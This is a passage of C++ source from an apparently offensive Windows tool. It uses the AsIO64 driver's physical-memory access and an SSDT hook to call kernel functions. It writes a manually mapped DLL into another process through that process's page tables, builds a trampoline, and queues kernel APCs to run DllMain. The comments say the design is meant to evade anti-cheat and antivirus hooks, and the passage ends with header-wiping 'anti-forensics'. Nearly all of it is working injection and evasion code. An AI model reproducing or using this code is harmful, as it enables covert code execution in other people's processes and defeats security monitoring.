                /* 74 */ 0xB8, 0x01, 0x00, 0x00, 0x00,
                /* 79 */ 0xC3,
            };
            static_assert(sizeof(code) == 0x7A, "Trampoline v2 size drifted");

            // Patch rip-relative displacement for `lock cmpxchg [rip+rel32], r9`.
            // Instruction at code+0x08, length 9; rip after instr = kCodeOffset+0x11.
            {
                const int64_t disp = static_cast<int64_t>(kFlagOffset) -
                                     static_cast<int64_t>(kCodeOffset + 0x11);
                const int32_t disp32 = static_cast<int32_t>(disp);
                std::memcpy(code + 0x0D, &disp32, sizeof(disp32));
            }
            // Patch jne rel32 → already_fired @ code offset 0x74.
            // Instruction at 0x11, length 6; rip after = 0x17 within code.
            {
                const int32_t disp32 = static_cast<int32_t>(0x74 - 0x17);
                std::memcpy(code + 0x13, &disp32, sizeof(disp32));
            }
            // Patch lea r10, [rip+rel32] → callbacks @ trampoline offset 0x08.
            // Instruction at 0x17, length 7; rip after = 0x1E within code,
            // i.e. absolute trampoline offset kCodeOffset + 0x1E.
            {
                const int64_t disp = static_cast<int64_t>(kCallbacksOffset) -
                                     static_cast<int64_t>(kCodeOffset + 0x1E);
                const int32_t disp32 = static_cast<int32_t>(disp);
                std::memcpy(code + 0x1A, &disp32, sizeof(disp32));
            }
            // Patch imm64 imageBase (mov rcx, imageBase) — two locations.
            std::memcpy(code + 0x28, &remoteBase, sizeof(remoteBase));
            std::memcpy(code + 0x4A, &remoteBase, sizeof(remoteBase));
            // Patch imm64 dllMainAbs.
            std::memcpy(code + 0x5C, &dllMainAbs, sizeof(dllMainAbs));

            const uint64_t trampolineEntryVa = trampolinePageVa + kCodeOffset;

            std::vector<uint8_t> trampolinePage(kTrampolinePageSize, 0);
            // Write callback VA list at +0x08 (NULL terminator already 0).
            if (tlsCallbackCount) {
                std::memcpy(trampolinePage.data() + kCallbacksOffset,
                            tlsCallbacks, tlsCallbackCount * sizeof(uint64_t));
            }
            // Write trampoline code at +0x100.
            std::memcpy(trampolinePage.data() + kCodeOffset, code, sizeof(code));

            // Same MDL fallback as image write — trampoline page lives in
            // the same R0AllocCmd block and faces the same working-set-trim
            // race.
            {
                constexpr size_t kPage = 0x1000;
                bool tpOk = true;
                uint64_t done = 0;
                const uint64_t total = trampolinePage.size();
                while (done < total) {
                    const uint64_t pageOffset = (trampolinePageVa + done) & (kPage - 1);
                    const size_t chunk = static_cast<size_t>(
                        std::min<uint64_t>(total - done, kPage - pageOffset));
                    if (!WriteTargetMemViaMdl(kernel, targetEprocess, 0,
                                              trampolinePageVa + done,
                                              trampolinePage.data() + done,
                                              chunk)) {
                        tpOk = false;
                        break;
                    }
                    done += chunk;
                }
                if (!tpOk) {
                    std::wcerr << L"[-] Failed to write once-only trampoline page" << std::endl;
                    break;
                }
            }

            // Verify the trampoline landed.
            uint8_t back[16]{};
            if (ReadTargetMem(kernel, targetCr3, trampolineEntryVa, back, sizeof(back))) {
                std::wcout << L"[+] Trampoline @ 0x" << std::hex << trampolineEntryVa << L": ";
                for (auto b : back) std::wcout << std::setw(2) << std::setfill(L'0') << static_cast<int>(b) << L' ';
                std::wcout << std::dec << std::endl;
            }

            outDllMainVa = trampolineEntryVa;
            std::wcout << L"[+] Once-only trampoline armed — DllMain @ 0x"
                       << std::hex << dllMainAbs << L" will run exactly once"
                       << L" (TLS callbacks: " << std::dec << tlsCallbackCount << L")"
                       << std::endl;
        } else {
            outDllMainVa = 0;
        }

        // Record .pdata SEH entries for a later user-mode APC registration.
        // Do not call ntdll!RtlAddFunctionTable from R0: that is a user-mode
        // VA and will bugcheck with ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY.
        out.RuntimeFunctionsVa = 0;
        out.RuntimeFunctionCount = 0;
        {
            const IMAGE_DATA_DIRECTORY& dir =
                localNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
            if (dir.VirtualAddress != 0 && dir.Size != 0 &&
                (dir.Size % sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY) == 0)) {
                out.RuntimeFunctionsVa = remoteBase + dir.VirtualAddress;
                out.RuntimeFunctionCount = dir.Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
                std::wcout << L"[+] .pdata pending user APC registration: va=0x"
                           << std::hex << out.RuntimeFunctionsVa
                           << L" count=" << std::dec << out.RuntimeFunctionCount
                           << L" base=0x" << std::hex << remoteBase << std::dec << std::endl;
            }
        }

        ok = true;
    } while (false);

    VirtualFree(localImage, 0, MEM_RELEASE);
    if (!ok) {
        // Freeing target memory from R0 would need another shellcode
        // (KeStackAttach + ZwFree + Detach). For homework scale we accept
        // the leak on the rare staging-failure path.
        std::wcerr << L"[-] Staging failed; target allocation leaked at 0x"
                   << std::hex << remoteBase << std::dec << std::endl;
        return false;
    }

    out.Process = nullptr;  // pure R0 — no handle
    out.RemoteBase = reinterpret_cast<void*>(remoteBase);
    out.ImageSize = imageSize;
    return true;
}

// =====================  R0 APC trigger  =====================
//
// KAPC layout on Windows 10/11 x64 (size 0x58). We build the struct in
// kernel memory and call KeInsertQueueApc through the NtAddAtom-SSDT
// hook so the trigger never touches CreateRemoteThread / NtQueueApcThread
// from user mode.
//
//   +0x00 UCHAR  Type            = 0x12 (ApcObject)
//   +0x01 UCHAR  AllFlags        = 0
//   +0x02 UCHAR  Size            = 0x58
//   +0x03 UCHAR  SpareByte1      = 0
//   +0x04 ULONG  SpareLong0      = 0
//   +0x08 PVOID  Thread          = PETHREAD
//   +0x10 LIST_ENTRY ApcListEntry= {0, 0}
//   +0x20 PVOID  KernelRoutine   = address of `ret` (no-op cleanup)
//   +0x28 PVOID  RundownRoutine  = NULL
//   +0x30 PVOID  NormalRoutine   = DllMain VA in target user space
//   +0x38 PVOID  NormalContext   = imageBase (becomes hinstDll)
//   +0x40 PVOID  SystemArgument1 = filled in by KeInsertQueueApc
//   +0x48 PVOID  SystemArgument2 = filled in by KeInsertQueueApc
//   +0x50 CHAR   ApcStateIndex   = 0 (OriginalApcEnvironment)
//   +0x51 CHAR   ApcMode         = 1 (UserMode)
//   +0x52 BOOLEAN Inserted       = 0
//   +0x53 padding

#pragma pack(push, 1)
struct KapcLayout {
    uint8_t  Type;
    uint8_t  AllFlags;
    uint8_t  Size;
    uint8_t  SpareByte1;
    uint32_t SpareLong0;
    uint64_t Thread;
    uint64_t ApcListFlink;
    uint64_t ApcListBlink;
    uint64_t KernelRoutine;
    uint64_t RundownRoutine;
    uint64_t NormalRoutine;
    uint64_t NormalContext;
    uint64_t SystemArgument1;
    uint64_t SystemArgument2;
    int8_t   ApcStateIndex;
    int8_t   ApcMode;
    uint8_t  Inserted;
    uint8_t  Pad0;
    uint32_t Pad1;
};
#pragma pack(pop)
static_assert(sizeof(KapcLayout) == 0x58, "Unexpected KAPC layout");

// Find a kernel-mode `RET` (0xC3) byte in ntoskrnl. Used as the KAPC
// KernelRoutine — it's invoked at APC_LEVEL before user delivery and we
// want it to be a true no-op. Scanning live kernel memory avoids hard-
// coding any version-dependent address.
static uint64_t FindKernelRetInstruction(AsioProvider& kernel) {
    const uint64_t ntoskrnl = kernel.NtoskrnlBase();
    if (!ntoskrnl) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!kernel.ReadKernelMemory(ntoskrnl, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }
    IMAGE_NT_HEADERS64 nt{};
    if (!kernel.ReadKernelMemory(ntoskrnl + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    // Read up to 0x10000 bytes at the start of .text and grab the first 0xC3.
    // ntoskrnl's .text always contains many bare RETs (small helper stubs).
    std::vector<IMAGE_SECTION_HEADER> sections(nt.FileHeader.NumberOfSections);
    const uint64_t firstSec = ntoskrnl + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
    if (!kernel.ReadKernelMemory(firstSec, sections.data(),
                                 sections.size() * sizeof(IMAGE_SECTION_HEADER))) {
        return 0;
    }
    for (const auto& sec : sections) {
        if ((sec.Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) continue;
        const uint64_t base = ntoskrnl + sec.VirtualAddress;
        const uint32_t size = std::min<uint32_t>(sec.Misc.VirtualSize ? sec.Misc.VirtualSize : sec.SizeOfRawData,
                                                 0x10000);
        std::vector<uint8_t> buf(size);
        if (!kernel.ReadKernelMemory(base, buf.data(), buf.size())) continue;
        for (uint32_t off = 0; off + 1 < buf.size(); ++off) {
            // Prefer a "ret + int3" pad pattern (0xC3 0xCC) — those are
            // function epilogues, very unlikely to be mid-instruction.
            if (buf[off] == 0xC3 && buf[off + 1] == 0xCC) {
                return base + off;
            }
        }
    }
    return 0;
}

// Build a KAPC in kernel pool, queue it into target threads via R0, and let
// the kernel dispatch NormalRoutine in user mode. This supports any user-mode
// 3-argument routine:
//   NormalRoutine(NormalContext, SystemArgument1, SystemArgument2)
static bool QueueUserModeRoutineViaR0Apc(AsioProvider& kernel, DWORD pid,
                                         const std::vector<DWORD>& candidateTids,
                                         uint64_t normalRoutine,
                                         uint64_t normalContext,
                                         uint64_t systemArgument1,
                                         uint64_t systemArgument2,
                                         const wchar_t* routineName) {
    const wchar_t* label = routineName ? routineName : L"user routine";
    if (!normalRoutine || candidateTids.empty()) {
        std::wcerr << L"[-] Cannot queue APC for " << label
                   << L": no routine or no candidate threads" << std::endl;
        return false;
    }

    const uint64_t ntoskrnl = kernel.NtoskrnlBase();
    const uint64_t psLookupThread = kernel.GetKernelModuleExport(ntoskrnl, "PsLookupThreadByThreadId");
    const uint64_t keInsertApc    = kernel.GetKernelModuleExport(ntoskrnl, "KeInsertQueueApc");
    const uint64_t obfDeref       = kernel.GetKernelModuleExport(ntoskrnl, "ObfDereferenceObject");
    if (!psLookupThread || !keInsertApc) {
        std::wcerr << L"[-] Failed to resolve PsLookupThreadByThreadId / KeInsertQueueApc" << std::endl;
        return false;
    }

    const uint64_t retGadget = FindKernelRetInstruction(kernel);
    if (!retGadget) {
        std::wcerr << L"[-] Could not locate a kernel RET gadget for APC KernelRoutine" << std::endl;
        return false;
    }
    std::wcout << L"[+] Kernel RET gadget: 0x" << std::hex << retGadget << std::dec << std::endl;
    std::wcout << L"[*] QueueUserModeRoutineViaR0Apc(" << label
               << L"): candidate threads=" << candidateTids.size()
               << L" routine=0x" << std::hex << normalRoutine
               << L" ctx=0x" << normalContext
               << L" arg1=0x" << systemArgument1
               << L" arg2=0x" << systemArgument2 << std::dec << std::endl;

    // One shared scratch slot for PsLookupThreadByThreadId's PETHREAD out-
    // pointer. KAPC bodies, however, MUST live in their own kernel pool
    // allocations — KeInsertQueueApc links the KAPC into per-thread queues
    // and the dispatcher keeps a pointer to it long after we return, so
    // reusing one buffer across threads would corrupt the kernel.
    const uint64_t threadOutPtr = kernel.AllocatePool(0x10);
    if (!threadOutPtr) {
        std::wcerr << L"[-] Failed to allocate kernel scratch for APC" << std::endl;
        return false;
    }

    size_t queuedCount = 0;
    NTSTATUS lastStatus = STATUS_SUCCESS;
    for (DWORD tid : candidateTids) {
        // Reset the PETHREAD slot to zero before each call.
        uint64_t zero = 0;
        kernel.WriteKernelMemory(threadOutPtr, &zero, sizeof(zero));

        NTSTATUS status = 0;
        if (!kernel.CallKernelFunction(&status, psLookupThread,
                                        static_cast<uint64_t>(tid), threadOutPtr)) {
            std::wcerr << L"[-] CallKernelFunction(PsLookupThreadByThreadId) failed" << std::endl;
            continue;
        }
        if (!NT_SUCCESS(status)) {
            lastStatus = status;
            continue;
        }

        uint64_t pethread = 0;
        if (!kernel.ReadKernelMemory(threadOutPtr, &pethread, sizeof(pethread)) || !pethread) {
            continue;
        }

        // Each thread gets its own KAPC body. The pool stays allocated for
        // the lifetime of the queued APC — see leak note below.
        const uint64_t apcKernelVa = kernel.AllocatePool(sizeof(KapcLayout) + 0x10);
        if (!apcKernelVa) {
            if (obfDeref) {
                NTSTATUS dummy = 0;
                kernel.CallKernelFunction(&dummy, obfDeref, pethread);
            }
            continue;
        }

        // Build the KAPC in a user-mode buffer, then copy it to kernel.
        // AllFlags bit 0 = SpecialUserApc (Win10 2004+) — instructs
        // KiDeliverApc to bypass the alertable-wait check and force-fire
        // the APC the next time the thread is at PASSIVE_LEVEL. On older
        // Windows the flag is ignored and we fall back to normal
        // alertable-wait delivery.
        KapcLayout kapc{};
        kapc.Type            = 0x12;     // ApcObject
        // AllFlags = 0: plain user APC. We tried bit 0 (SpecialUserApc on
        // older Win10 builds) earlier but bit 0 is actually
        // `CallbackDataContext` in Win11 26200's _KAPC, which makes the
        // dispatcher mis-interpret NormalContext and silently drop the
        // user-mode delivery. With 114 threads we just rely on at least
        // one to enter an alertable wait within a few seconds — Notepad
        // worker threads do this routinely on WaitForSingleObjectEx /
        // GetQueuedCompletionStatusEx / SleepEx callsites. If we still
        // need force-fire, the next escalation is to use the proper
        // KiSchedulerApc-style KernelRoutine + Win10-2004 special encoding.
        kapc.AllFlags        = 0x00;
        kapc.Size            = sizeof(KapcLayout);
        kapc.Thread          = pethread;
        kapc.KernelRoutine   = retGadget;
        kapc.RundownRoutine  = 0;
        kapc.NormalRoutine   = normalRoutine;
        kapc.NormalContext   = normalContext;
        kapc.ApcStateIndex   = 0;        // OriginalApcEnvironment
        kapc.ApcMode         = 1;        // UserMode → APC dispatched in R3
        kapc.Inserted        = 0;
        if (!kernel.WriteKernelMemory(apcKernelVa, &kapc, sizeof(kapc))) {
            if (obfDeref) {
                NTSTATUS dummy = 0;
                kernel.CallKernelFunction(&dummy, obfDeref, pethread);
            }
            continue;
        }

        // KeInsertQueueApc(Apc, SystemArgument1, SystemArgument2, Priority=0)
        BOOLEAN ok = FALSE;
        const bool callOk = kernel.CallKernelFunction(
            &ok, keInsertApc,
            apcKernelVa,
            systemArgument1,
            systemArgument2,
            static_cast<uint64_t>(0)); // Priority increment

        if (obfDeref) {
            NTSTATUS dummy = 0;
            kernel.CallKernelFunction(&dummy, obfDeref, pethread);
        }

        if (!callOk) {
            std::wcerr << L"[-] CallKernelFunction(KeInsertQueueApc) failed for TID " << tid << std::endl;
            continue;
        }
        if (ok) {
            ++queuedCount;
            // Only log a few — Notepad/UE games have 100+ threads and we
            // don't want to flood the console.
            if (queuedCount <= 4) {
                std::wcout << L"[+] APC queued into TID " << tid
                           << L"  PETHREAD=0x" << std::hex << pethread
                           << L"  " << label << L"=0x" << normalRoutine << std::dec << std::endl;
            }
        }
    }

    std::wcout << L"[+] Queued " << queuedCount << L" of " << candidateTids.size()
               << L" APCs for " << label
               << L" (plain user APC; fires when a target thread enters an alertable wait)" << std::endl;

    if (!queuedCount) {
        std::wcerr << L"[-] Failed to queue " << label << L" APC into any thread of PID " << pid;
        if (lastStatus) {
            std::wcerr << L" (last PsLookupThreadByThreadId status: 0x" << std::hex << lastStatus << std::dec << L")";
        }
        std::wcerr << std::endl;
    }

    // Note: we intentionally keep the scratch + per-thread KAPC pool
    // allocations alive until the APC fires. Freeing here would crash the
    // kernel when the dispatcher derefs Apc->Thread / NormalContext. For
    // the homework we accept the small permanent leak per inject.
    return queuedCount > 0;
}

static bool TriggerDllMainViaR0Apc(AsioProvider& kernel, DWORD pid,
                                   const std::vector<DWORD>& candidateTids,
                                   uint64_t dllMainVa, uint64_t imageBase) {
    return QueueUserModeRoutineViaR0Apc(kernel, pid, candidateTids,
                                        dllMainVa,
                                        imageBase,
                                        static_cast<uint64_t>(1),
                                        static_cast<uint64_t>(0),
                                        L"DllMain");
}

// Top-level R0-triggered DLL injection.
//
// We still call OpenProcess + VirtualAllocEx + VirtualProtectEx (those go
// through NtOpenProcess / NtAllocateVirtualMemory / NtProtectVirtualMemory).
// Future work — see the blueprint at the bottom of this file — replaces
// allocation with an R0 shellcode (KeStackAttachProcess + ZwAllocate-
// VirtualMemory) and resolves imports via PEB walking through target CR3.
// Step ⑤ of that blueprint (image write via physical memory) is already
// done here: WriteTargetMem in StageRemoteDll does the byte copy through
// AsIO64 + target CR3 page-walking, so a rogue R0 hook on
// NtWriteVirtualMemory / MmCopyVirtualMemory never sees this transfer.
static bool InjectDllRemoteR0Trigger(AsioProvider& kernel, DWORD pid,
                                     const std::vector<uint8_t>& rawImage,
                                     const std::wstring& dllPath,
                                     RemoteMappedDll& out) {
    // Pure-R0 path. Sequence:
    //   1) PsLookupProcessByProcessId       → target EPROCESS
    //   2) Read EPROCESS+0x28               → target CR3
    //   3) Walk EPROCESS for PEB            → target PEB
    //   4) StageRemoteDll
    //        - AllocateTargetUserMem       (R0 shellcode: KeStackAttach + ZwAlloc + Detach)
    //        - ResolveImportsViaTargetCr3  (R0 reads through target CR3)
    //        - WriteTargetMem              (R0 physical writes through target CR3)
    //   5) TriggerDllMainViaR0Apc           (R0 KAPC built in kernel pool)
    //
    // Nothing in this path opens a HANDLE to the target. NtOpenProcess /
    // NtAllocateVirtualMemory / NtWriteVirtualMemory / NtProtectVirtualMemory
    // / NtQueryInformationProcess / NtCreateThreadEx / NtQueueApcThread are
    // never invoked from R3 against the target.
    const uint64_t eprocess = ResolveTargetEprocess(kernel, pid);
    if (!eprocess) {
        std::wcerr << L"[-] PsLookupProcessByProcessId failed for PID " << pid << std::endl;
        return false;
    }
    std::wcout << L"[+] Target EPROCESS: 0x" << std::hex << eprocess << std::dec << std::endl;

    const uint64_t targetCr3 = ReadTargetCr3(kernel, eprocess);
    if (!targetCr3) {
        std::wcerr << L"[-] Could not read target's DirectoryTableBase (CR3)" << std::endl;
        return false;
    }
    std::wcout << L"[+] Target CR3: 0x" << std::hex << targetCr3 << std::dec << std::endl;

    const uint64_t targetPeb = ReadTargetPeb(kernel, eprocess);
    if (!targetPeb) {
        std::wcerr << L"[-] Could not read target's PEB pointer" << std::endl;
        return false;
    }
    std::wcout << L"[+] Target PEB: 0x" << std::hex << targetPeb << std::dec << std::endl;

    uint64_t dllMainVa = 0;
    if (!StageRemoteDll(kernel, eprocess, targetCr3, targetPeb, rawImage, out, dllMainVa)) {
        return false;
    }
    out.Pid = pid;
    out.Path = dllPath;

    if (!dllMainVa) {
        std::wcout << L"[*] Target DLL has no entry point — skipping APC trigger" << std::endl;
        return true;
    }

    const auto tids = EnumerateProcessThreads(pid);
    if (tids.empty()) {
        std::wcerr << L"[-] Target process has no enumerable threads" << std::endl;
        return false;
    }
    std::wcout << L"[+] Found " << tids.size() << L" threads in target PID " << pid << std::endl;

    const uint64_t imageBase = reinterpret_cast<uint64_t>(out.RemoteBase);
    if (out.RuntimeFunctionsVa && out.RuntimeFunctionCount) {
        TargetEprocessScope _epScope(eprocess);
        const uint64_t ntdllBase = ResolveTargetModuleBase(kernel, targetCr3, targetPeb, "ntdll.dll");
        const uint64_t rtlAddFunctionTable = ntdllBase
            ? ResolveTargetExport(kernel, targetCr3, targetPeb, ntdllBase, "RtlAddFunctionTable", 0)
            : 0;
        if (!rtlAddFunctionTable) {
            std::wcerr << L"[!] SEH .pdata registration skipped: ntdll!RtlAddFunctionTable not resolved"
                       << std::endl;
        } else {
            std::wcout << L"[*] Queueing .pdata registration APC: RtlAddFunctionTable=0x"
                       << std::hex << rtlAddFunctionTable
                       << L" runtime=0x" << out.RuntimeFunctionsVa
                       << L" count=" << std::dec << out.RuntimeFunctionCount
                       << L" base=0x" << std::hex << imageBase << std::dec << std::endl;
            if (!QueueUserModeRoutineViaR0Apc(kernel, pid, tids,
                                             rtlAddFunctionTable,
                                             out.RuntimeFunctionsVa,
                                             static_cast<uint64_t>(out.RuntimeFunctionCount),
                                             imageBase,
                                             L"RtlAddFunctionTable")) {
                std::wcerr << L"[!] SEH .pdata registration APC queue failed (continuing without it)"
                           << std::endl;
            }
        }
    }

    std::wcout << L"[*] Queueing DllMain APC for imageBase=0x" << std::hex << imageBase
               << L" dllMain=0x" << dllMainVa << std::dec << std::endl;
    const bool apcOk = TriggerDllMainViaR0Apc(kernel, pid, tids, dllMainVa, imageBase);
    std::wcout << (apcOk ? L"[+] DllMain APC queue stage completed" : L"[-] DllMain APC queue stage failed") << std::endl;
    return apcOk;
}

// =====================  Pure-R0 target memory primitives  =====================
//
// Goal: avoid R0 hooks that rogue software / anti-cheat / AV products place
// on ntoskrnl memory APIs and on R3 ntdll/kernel32 stubs. By walking the
// target's CR3 ourselves and writing through AsIO64's physical-memory
// IOCTL, we never touch:
//   - NtReadVirtualMemory / NtWriteVirtualMemory (R3 syscalls hooked in ntdll)
//   - MmCopyVirtualMemory / MiCopyVirtualMemory (kernel helpers hooked at R0)
//   - KeStackAttachProcess + ZwReadVirtualMemory paths
// The kernel only sees AsIO64's MAPMEM IOCTL, which the rogue product would
// need to specifically hook on the AsIO64 device — far less common.

// EPROCESS.DirectoryTableBase offset. Stable at 0x28 from Win7 x64 to current.
constexpr uint64_t kEprocessDtbOffset = 0x28;

// Look up a target process's EPROCESS via PsLookupProcessByProcessId,
// driven through the existing NtAddAtom SSDT hook. Returns 0 on failure.
// The reference grabbed by PsLookup is released through ObfDereferenceObject.
static uint64_t ResolveTargetEprocess(AsioProvider& kernel, DWORD pid) {
    if (!pid) {
        return 0;
    }
    const uint64_t ntoskrnl = kernel.NtoskrnlBase();
    const uint64_t psLookupProc = kernel.GetKernelModuleExport(ntoskrnl, "PsLookupProcessByProcessId");
    if (!psLookupProc) {
        std::wcerr << L"[-] PsLookupProcessByProcessId not resolved" << std::endl;
        return 0;
    }

    const uint64_t scratch = kernel.AllocatePool(0x20);
    if (!scratch) {
        std::wcerr << L"[-] Failed to allocate scratch for PsLookupProcessByProcessId" << std::endl;
        return 0;
    }
    uint64_t zero = 0;
    kernel.WriteKernelMemory(scratch, &zero, sizeof(zero));

    NTSTATUS status = 0;
    if (!kernel.CallKernelFunction(&status, psLookupProc,
                                    static_cast<uint64_t>(pid), scratch)) {
        std::wcerr << L"[-] CallKernelFunction(PsLookupProcessByProcessId) failed" << std::endl;
        kernel.FreePool(scratch);
        return 0;
    }
    if (!NT_SUCCESS(status)) {
        std::wcerr << L"[-] PsLookupProcessByProcessId returned 0x"
                   << std::hex << status << std::dec << std::endl;
        kernel.FreePool(scratch);
        return 0;
    }

    uint64_t eprocess = 0;
    kernel.ReadKernelMemory(scratch, &eprocess, sizeof(eprocess));
    kernel.FreePool(scratch);

    if (eprocess) {
        // Release the reference. We keep the EPROCESS pointer cached for the
        // duration of this run; if the process exited under us, subsequent
        // CR3 reads will fail and we bail out cleanly.
        const uint64_t obfDeref = kernel.GetKernelModuleExport(ntoskrnl, "ObfDereferenceObject");
        if (obfDeref) {
            NTSTATUS dummy = 0;
            kernel.CallKernelFunction(&dummy, obfDeref, eprocess);
        }
    }
    return eprocess;
}

// Read target EPROCESS->DirectoryTableBase (CR3). This is the page-table
// root for the target process — every user VA in target maps through it.
static uint64_t ReadTargetCr3(AsioProvider& kernel, uint64_t eprocess) {
    if (!eprocess) return 0;
    uint64_t cr3 = 0;
    if (!kernel.ReadKernelMemory(eprocess + kEprocessDtbOffset, &cr3, sizeof(cr3))) {
        std::wcerr << L"[-] ReadKernelMemory(EPROCESS+0x28) failed" << std::endl;
        return 0;
    }
    // Sanity: CR3 has the low 12 bits effectively zero (PCID excepted; modern
    // Win11 keeps low 12 zero for kernel queries since PCID is hidden in CR3
    // via the PCID extension — the actual PML4 physical addr is still aligned).
    if (cr3 == 0 || (cr3 & 0xFFFull) != 0) {
        // Keep the value; print a hint but do not abort — KVA Shadow / KPTI
        // makes a few low bits drift on some pages, and the page-walker below
        // masks them off anyway.
        std::wcout << L"[*] Target CR3 looks unusual: 0x" << std::hex << cr3 << std::dec << std::endl;
    }
    return cr3 & kPhyAddressMask;
}

// Walk a target's PML4 to translate one user VA to a physical address.
// Mirrors AsioProvider::VirtualToPhysical but takes an explicit CR3 instead
// of using the cached system CR3.
static bool TargetVtoP(AsioProvider& kernel, uint64_t cr3, uint64_t va, uint64_t& outPhys) {
    if (!cr3) return false;

    uint64_t table = cr3 & kPhyAddressMask;
    for (int level = 0; level < 4; ++level) {
        const int shift = 39 - (level * 9);
        const uint64_t selector = (va >> shift) & 0x1ff;

        uint64_t entry = 0;
        if (!kernel.ReadPhysical(table + selector * sizeof(uint64_t), &entry, sizeof(entry))) {
            return false;
        }
        if (!(entry & kEntryPresent)) {
            return false;
        }

        table = entry & kPhyAddressMask;
        if (entry & kEntryPageSize) {
            if (level == 1) {
                outPhys = (entry & kPhyAddressMask1Gb) + (va & kVirtualAddressMask1Gb);
                return true;
            }
            if (level == 2) {
                outPhys = (entry & kPhyAddressMask2Mb) + (va & kVirtualAddressMask2Mb);
                return true;
            }
        }
    }
    outPhys = table + (va & kVirtualAddressMask4Kb);
    return true;
}

// Walk PML4 → PDP → PD → PT and return the raw 64-bit PT entry for `va`
// (or the PDP/PD entry if a large page covers `va`). Unlike TargetVtoP
// which bails on any non-present entry, this returns the PTE value as-is
// so callers can inspect software PTE bits (Transition / Prototype) and
// decide whether MmProbeAndLockPages is safe to call.
//
// outPte == 0 means "no mapping exists for this VA at all" — at some
// level the upper-table entry was zero, so there isn't even a PT to
// inspect. outPte != 0 with bit 0 == 0 means a software/invalid PTE
// whose other bits describe the page's eviction state.
//
// Return value is false only on phys-read failure (driver/provider
// problem), not on absence-of-mapping.
static bool ReadTargetPteRaw(AsioProvider& kernel, uint64_t cr3, uint64_t va, uint64_t& outPte) {
    outPte = 0;
    if (!cr3) return false;

    uint64_t table = cr3 & kPhyAddressMask;
    for (int level = 0; level < 4; ++level) {
        const int shift = 39 - (level * 9);
        const uint64_t selector = (va >> shift) & 0x1ff;
        uint64_t entry = 0;
        if (!kernel.ReadPhysical(table + selector * sizeof(uint64_t), &entry, sizeof(entry))) {
            return false;
        }
        if (level == 3) {
            outPte = entry;
            return true;
        }
        // Upper-table entry not present == no PT exists for this VA.
        if (!(entry & kEntryPresent)) {
            outPte = 0;
            return true;
        }
        // Large-page mapping at this upper level — treat as the leaf PTE.
        if ((entry & kEntryPageSize) && (level == 1 || level == 2)) {
            outPte = entry;
            return true;
        }
        table = entry & kPhyAddressMask;
    }
    return false;
}

// Decide whether MmProbeAndLockPages can be expected to succeed (or at
// worst page-in cleanly) for every 4 KiB page in [va, va+size). The
// goal is to refuse to issue the kernel call for VAs that would
// deterministically raise (no VAD / demand-zero / weird software PTE),
// since our raw shellcode has no SEH and a raise == bugcheck.
//
// Decision per page:
//   * Valid (bit 0 = 1)              → ALLOW (lock will succeed instantly)
//   * Transition (bit 0 = 0, bit 11) → ALLOW (page is on standby/modified
//                                      list, lock pulls it back without IO)
//   * Prototype (bit 0 = 0, bit 10)  → ALLOW (file-backed; lock will issue
//                                      a page-in IO; raise possible only on
//                                      file-IO error — rare in practice)
//   * Everything else                → REJECT
//
// PTE bit positions are the standard x64 Windows layout — bit 0 P, bit 10
// Prototype, bit 11 Transition (when P=0). Confirmed against Windows
// Internals 7e and ReactOS source.
static bool IsVaLockableForMdl(AsioProvider& kernel, uint64_t cr3, uint64_t va, size_t size) {
    if (!cr3 || !size) return false;
    constexpr size_t kPage = 0x1000;
    constexpr uint64_t kPteValid      = 1ull << 0;
    constexpr uint64_t kPtePrototype  = 1ull << 10;
    constexpr uint64_t kPteTransition = 1ull << 11;

    uint64_t cur = va & ~(kPage - 1);
    const uint64_t end = va + size;
    while (cur < end) {
        uint64_t pte = 0;
        if (!ReadTargetPteRaw(kernel, cr3, cur, pte)) {
            // phys read failure on PT walk — provider problem, not the
            // VA's fault. Treat as un-lockable to be safe.
            return false;
        }
        if (pte == 0) {
            // No mapping. Definitely not lockable.
            return false;
        }
        const bool ok = (pte & kPteValid) ||
                        (pte & kPteTransition) ||
                        (pte & kPtePrototype);
        if (!ok) {
            return false;
        }
        cur += kPage;
    }
    return true;
}

// Read from a target user VA. Splits the request across 4 KiB boundaries
// (each chunk needs its own VA→phys translation since pages can be discon-
// tiguous in physical memory).
static bool ReadTargetMem(AsioProvider& kernel, uint64_t cr3, uint64_t va,
                          void* outBuffer, size_t size) {
    if (!size) return true;
    if (!cr3 || !outBuffer) return false;

    uint8_t* out = static_cast<uint8_t*>(outBuffer);
    size_t done = 0;
    while (done < size) {
        const uint64_t current = va + done;
        const size_t pageOffset = static_cast<size_t>(current & (kPageSize - 1));
        const size_t chunk = std::min(size - done, static_cast<size_t>(kPageSize - pageOffset));

        uint64_t physical = 0;
        if (!TargetVtoP(kernel, cr3, current, physical)) {
            return false;
        }
        if (!kernel.ReadPhysical(physical, out + done, chunk)) {
            return false;
        }
        done += chunk;
    }
    return true;
}

// Write to a target user VA — same chunking as ReadTargetMem. Writes go
// through AsIO64's physical-memory mapping primitive; the target process
// itself never sees an NtWriteVirtualMemory syscall, so any user-mode
// hook on it stays silent.
static bool WriteTargetMem(AsioProvider& kernel, uint64_t cr3, uint64_t va,
                           const void* srcBuffer, size_t size) {
    if (!size) return true;
    if (!cr3 || !srcBuffer) return false;

    const uint8_t* src = static_cast<const uint8_t*>(srcBuffer);
    size_t done = 0;
    while (done < size) {
        const uint64_t current = va + done;
        const size_t pageOffset = static_cast<size_t>(current & (kPageSize - 1));
        const size_t chunk = std::min(size - done, static_cast<size_t>(kPageSize - pageOffset));

        uint64_t physical = 0;
        if (!TargetVtoP(kernel, cr3, current, physical)) {
            return false;
        }
        if (!kernel.WritePhysical(physical, src + done, chunk)) {
            return false;
        }
        done += chunk;
    }
    return true;
}

// Post-inject anti-forensics: zero the MZ + PE + section-header bytes of an
// injected image at `remoteBase` in the target. We zero a generous 0x400
// bytes covering DOS header, NT headers, and the section table. The image
// body (code + reloc-fixed data) is untouched and continues to execute.
//
// Effect: a R3 signature scanner walking the target's RWX private pages no
// longer recognizes the region as a PE; tools that match "MZ at page start"
// or extract PE sections will miss it. RTTI / vtable scans still hit, so
